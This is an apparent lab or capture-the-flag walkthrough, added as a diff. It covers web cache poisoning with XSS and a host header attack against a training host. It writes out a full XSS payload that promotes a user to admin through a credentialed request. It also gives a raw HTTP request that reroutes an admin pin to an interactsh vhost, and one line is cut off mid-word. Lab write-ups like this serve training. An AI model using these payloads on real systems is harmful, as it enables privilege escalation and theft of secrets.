@@ -1,0 +1,27 @@
+***Hard Skill Assessment***
+
+The script at the botto
+
+The admin link in the "users" tab uses the following url "http://httpattacks.htb:52191/admin/users.html?sort_by=role" and uses the role paramter as a paramter in a javascript function being initiated by a script tag
+
+This javascript function is vulnerable to xss and you can use the following url to poison it (this url is used when clicking on the "users" tab:
+/admin/users
+
+Use the following payload to poison the web cache and get promoted to admin:
+/admin/users.html?sort_by=role&utm_source=index.html;sort_by=role")%3B</script><script>var+xhr+=+new+XMLHttpRequest()%3bxhr.open('GET',+'/admin/promote%3fuid%3d2',+true)%3bxhr.withCredentials+=+true%3bxhr.send()%3b</script><script>("
+
+  - Use burpsuite
+
+After getting promoted to admin you can now access the "sysinfo" tab that was previously only accessible by the admin.
+
+There it should prompt you for a pin.
+
+There is a link that it explicitly tells the user that it for admin use click on it and use the following a host header attack to route the request to the interactsh.local vhost
+
+Get /admin/sysinfo?refresh=1 HTTP/1.1
+Host: httpattacks.htb:42289
+X-HTTP-Host-Override: interactsh.local
+
+Navigate to interactsh.local/log to see if you intercepted the pin number.
+
+Use the pin number to get the flag.
